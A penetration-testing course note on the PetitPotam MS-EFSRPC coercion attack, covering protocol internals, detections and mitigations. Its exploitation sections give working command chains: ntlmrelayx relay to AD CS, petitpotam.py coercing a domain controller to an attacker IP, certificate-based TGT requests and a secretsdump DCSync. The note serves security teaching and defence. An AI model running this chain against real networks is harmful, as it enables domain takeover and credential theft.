---
tags: [active-directory, coercion, relay, vapt]
difficulty: expert
module: "64 - Advanced Coercion and Relay Attacks"
topic: "64.03 PetitPotam MS-EFSRPC Deep Dive"
---

# PetitPotam MS-EFSRPC Deep Dive

## Introduction
Discovered in July 2021 by security researcher Gilles Lionel (@topotam77), "PetitPotam" is a devastating authentication coercion vulnerability that abuses the Microsoft Encrypting File System Remote Protocol (MS-EFSRPC). 

Similar to the PrinterBug, PetitPotam forces a target machine (typically a Domain Controller) to initiate an outbound SMB connection and authenticate via NTLM to an attacker-controlled IP address. However, PetitPotam was infinitely more dangerous upon its release for two critical reasons:
1. **Unauthenticated Execution:** At the time of discovery, several MS-EFSRPC RPC methods could be invoked *without any prior authentication* (via null sessions) in many default environments. This meant an attacker could sit on the network, run PetitPotam anonymously against a DC, and immediately capture the DC's machine account hash.
2. **Spooler Irrelevance:** Because the Print Spooler service was the primary vector for coercion, organizations had disabled it on DCs. PetitPotam bypassed this defense entirely by targeting the EFS service, which is built deeply into Windows and often enabled by default.

When combined with Active Directory Certificate Services (AD CS) misconfigurations (specifically ESC8), PetitPotam allowed for unauthenticated Domain Admin compromise in seconds.

## MS-EFSRPC Protocol Deep Dive
The MS-EFSRPC protocol is designed to manage files encrypted with the Encrypting File System (EFS) over a network. It allows clients to encrypt, decrypt, and manage encrypted data remotely.

The protocol exposes several RPC methods. The most infamous method exploited by PetitPotam is `EfsRpcOpenFileRaw` (Opnum 0).

### The Mechanics of the Function
The interface is exposed via the `\PIPE\lsarpc`, `\PIPE\samr`, `\PIPE\lsass`, `\PIPE\netlogon`, and crucially, `\PIPE\efsrpc` named pipes.

The function signature for `EfsRpcOpenFileRaw` is:
```c
long EfsRpcOpenFileRaw(
  [in] handle_t binding_h,
  [out] PEXIMPORT_CONTEXT_HANDLE* hContext,
  [in, string] wchar_t* FileName,
  [in] long Flags
);
```

The vulnerability lies in the `FileName` parameter. The function expects a path to an encrypted file. If an attacker supplies a UNC path pointing to their own machine (e.g., `\\ATTACKER_IP\share\file.txt`), the target server's `lsass.exe` process will invoke the Multiple Provider Router to connect to that UNC path.

Because `lsass.exe` runs as `NT AUTHORITY\SYSTEM`, the outbound SMB connection attempts to authenticate using the target's machine account (`DOMAIN\TARGET$`). 

What makes PetitPotam robust is that the MS-EFSRPC protocol contains numerous methods susceptible to this UNC path injection, including:
- `EfsRpcOpenFileRaw`
- `EfsRpcEncryptFileSrv`
- `EfsRpcDecryptFileSrv`
- `EfsRpcQueryUsersOnFile`
- `EfsRpcQueryRecoveryAgents`

## ASCII Diagram: PetitPotam Exploitation Flow

```text
  +-----------------------+                            +-------------------------+
  |    Attacker Machine   |                            |     Target Machine      |
  | (No creds or low priv)|                            |   (e.g., Domain Ctrl)   |
  +-----------------------+                            +-------------------------+
              |                                                     |
              | 1. Bind to MS-EFSRPC (\PIPE\lsarpc)                 |
              |    (Initially allowed via Null Session)             |
              |---------------------------------------------------->|
              |                                                     |
              | 2. Call EfsRpcOpenFileRaw (Opnum 0)                 |
              |    FileName = \\ATTACKER_IP\test\test.txt           |
              |---------------------------------------------------->|
              |                                                     |
              |                                                     |  (LSASS processes request,
              |                                                     |   attempts to open file
              |                                                     |   at \\ATTACKER_IP...)
              |                                                     |
              | 3. Outbound SMB/HTTP Connection (NTLM Type 1)       |
              |<----------------------------------------------------|  (Authenticating as TARGET$)
              |                                                     |
  +-----------------------+                                         |
  |  Attacker NTLMRelayx  |  4. Relay to AD CS (ESC8)               |
  |  receives connection  |---------------------------------------> |
  +-----------------------+                                         |
```

## Attack Prerequisites & Enumeration
1. **Credentials:** 
   - *Pre-Patch:* No credentials required (Unauthenticated via Null Session).
   - *Post-Patch:* A valid domain user credential is required to access the `IPC$` share and bind to the named pipe.
2. **RPC Reachability:** TCP port 445 or 135 must be accessible.
3. **EFS API Availability:** The RPC endpoints must not be blocked by RPC filters.
4. **Relay Target:** A target vulnerable to relay, typically AD CS Web Enrollment (HTTP without EPA) or an Unconstrained Delegation server.

### Enumerating MS-EFSRPC
You can use `rpcdump.py` to identify if the interface is available:
```bash
rpcdump.py <TARGET_IP> | grep -A 5 'MS-EFSRPC'
```
Look for UUID `c681d488-d850-11d0-8c52-00c04fd90f7e`.

You can also use NetExec (formerly CrackMapExec) with the petitpotam module to check vulnerability:
```bash
nxc smb <TARGET_IP> -u '' -p '' -M petitpotam
nxc smb <TARGET_IP> -u 'user' -p 'password' -M petitpotam
```

## Step-by-Step Exploitation

### Phase 1: Setup NTLM Relay targeting AD CS
The classic attack chain relays the DC's authentication to an AD CS server to request a certificate.

```bash
ntlmrelayx.py -t http://192.168.1.20/certsrv/certfnsh.asp -smb2support --adcs --template DomainControllers
```
*Note: `192.168.1.20` is the AD CS server.*

### Phase 2: Triggering PetitPotam
Using the `petitpotam.py` script or the compiled C binary.

**Unauthenticated Attempt:**
```bash
python3 petitpotam.py 192.168.1.100 192.168.1.10
```
*(Where `.100` is attacker, `.10` is target DC)*

**Authenticated Attempt (if patched against null sessions):**
```bash
python3 petitpotam.py -u 'sanchit' -p 'P@ssw0rd123' -d 'corp.local' 192.168.1.100 192.168.1.10
```

**Output:**
```
[*] Trying EfsRpcOpenFileRaw...
[*] Generating a random pipe name...
[*] EfsRpcOpenFileRaw succeeded!
```

If successful, look at your `ntlmrelayx` console. You will see an incoming connection from `DC01$`, which is relayed to `http://192.168.1.20`. 
Because the AD CS server is communicating over HTTP (and assuming EPA is not enforced), the relay is successful, and a Base64-encoded `.pfx` certificate belonging to `DC01$` is outputted to the console.

### Phase 3: Post-Exploitation
With the Domain Controller's certificate, you can request a TGT using Rubeus or Pass-The-Cert tools.
```bash
gettgtpkinit.py -cert-pfx dc01.pfx -pfx-pass "" "corp.local/DC01$" dc01.ccache
export KRB5CCNAME=dc01.ccache
secretsdump.py -k -no-pass DC01\$@192.168.1.10
```
This grants full DCSync privileges, completing the domain compromise.

## WebDAV Coercion (Bypassing SMB restrictions)
If the target is configured to block outbound SMB (port 445), PetitPotam can force a connection over HTTP/WebDAV if the `WebClient` service is running on the target.
You specify the attacker IP in UNC WebDAV format:
```bash
python3 petitpotam.py 'attacker_ip@80/test' 192.168.1.10
```
This forces the DC to authenticate over HTTP, completely bypassing SMB egress filters.

## Network and Host Detections

### Network Monitoring
- **DCE/RPC Bind:** Alert on connections binding to the MS-EFSRPC UUID `c681d488-d850-11d0-8c52-00c04fd90f7e`.
- **DCE/RPC Request:** Monitor for Opnums 0, 2, 3, 4, 11 (the vulnerable functions in the EFS interface).

### Host Event Logs
- **Event ID 5145 (Network Share Object Access):**
  Monitor for access to `\PIPE\lsarpc`, `\PIPE\efsrpc`, or `\PIPE\samr` originating from unusual IPs followed immediately by outbound connections.
- **Event ID 4624 / 4625:** 
  Monitor for anomalous network logons (`Logon Type 3`) where the `Account Name` is a Domain Controller machine account.
- **Event ID 4662 (Active Directory Object Access):**
  If relayed to AD CS, monitor for excessive certificate requests.

## Mitigation Strategies

Microsoft's response to PetitPotam was phased, involving multiple CVEs (CVE-2021-36942) and registry patches.

1. **Disable EFS Service (If unused):**
   The most robust fix is to disable the underlying service.
   Set the registry key `HKLM\SOFTWARE\Policies\Microsoft\Windows NT\CurrentVersion\EFS` value `EfsConfiguration` to `1` (Disabled).
2. **Apply Microsoft Patches:**
   Ensure all domain controllers are fully patched. The patches restrict the EFS API from allowing unauthenticated (null session) access and block the specific `EfsRpcOpenFileRaw` vector. *Note: Other functions may still be vulnerable to authenticated coercion.*
3. **RPC Filtering:**
   Deploy RPC filters via Group Policy to block remote access to the MS-EFSRPC interface. 
   Create a filter for the EFS UUID `c681d488-d850-11d0-8c52-00c04fd90f7e` to only allow local access.
4. **Secure Relay Targets (AD CS):**
   The primary danger of PetitPotam was the AD CS relay. You MUST enable Extended Protection for Authentication (EPA) on IIS for the Certificate Services Web Enrollment portal. Furthermore, enforce HTTPS and disable HTTP entirely for enrollment.
5. **Disable WebClient:**
   Disable the WebClient service on Domain Controllers to prevent WebDAV coercion bypasses.

## Troubleshooting
- **`STATUS_ACCESS_DENIED`:** You are attempting an unauthenticated exploit against a patched server. You must provide valid user credentials.
- **`ERROR_BAD_NETPATH`:** The target attempted to connect back to you, but the connection dropped. Check firewalls on port 445 or 80.
- **RPC Bind fails:** The target has RPC filtering enabled, or the EFS service is disabled.

## Real-World Attack Scenario

During a network penetration test, the attacker identified a Windows Server 2019 Domain Controller (`DC01` at `10.5.5.10`). While the Print Spooler was disabled, negating the PrinterBug, the attacker noted that the MS-EFSRPC service was still active. Concurrently, they identified an internal AD CS server (`CA01` at `10.5.5.20`) with Web Enrollment enabled over HTTP, lacking Extended Protection for Authentication (EPA).

The attacker set up an NTLM relay listener targeting the CA:

```bash
ntlmrelayx.py -t http://10.5.5.20/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
```

With standard domain credentials (`j.smith`), the attacker executed PetitPotam to coerce `DC01`. Because the target was partially patched, they used the authenticated mode to invoke the `EfsRpcOpenFileRaw` method:

```bash
python3 petitpotam.py -u 'j.smith' -p 'P@ssw0rd2024' -d 'corp.local' 10.5.5.100 10.5.5.10
```

`DC01` received the RPC call via the `\PIPE\lsarpc` pipe and immediately generated an outbound SMB authentication request to the attacker's IP (`10.5.5.100`). `ntlmrelayx.py` intercepted the authentication from `DC01$` and relayed it to the AD CS HTTP endpoint. 

Because EPA was not enforced on the CA, the relay succeeded, and the CA issued a base64-encoded machine certificate for the Domain Controller. The attacker copied the certificate, used `gettgtpkinit.py` to obtain a high-privileged Kerberos TGT, and executed a DCSync attack, achieving total domain compromise within minutes.

## Chaining Opportunities
- **PetitPotam + AD CS (ESC8):** The most famous and lethal chain. Unauthenticated or authenticated coercion leading to DCSync.
- **PetitPotam + WebClient Abuse:** Bypassing strict outbound firewall rules by coercing via HTTP.
- **PetitPotam + NTLM Relay to SMB:** If targeting a regular server (not a DC) where SMB signing is disabled, you can relay the authentication to another server to gain local admin access.

## Related Notes
- [[01 - Authentication Coercion Overview]]
- [[02 - PrinterBug SpoolSample Exploitation]]
- [[25 - Active Directory Certificate Services (AD CS) Exploitation]]
- [[30 - Resource-Based Constrained Delegation (RBCD)]]
- [[35 - Active Directory Certificate Templates (ESC1-ESC14)]]
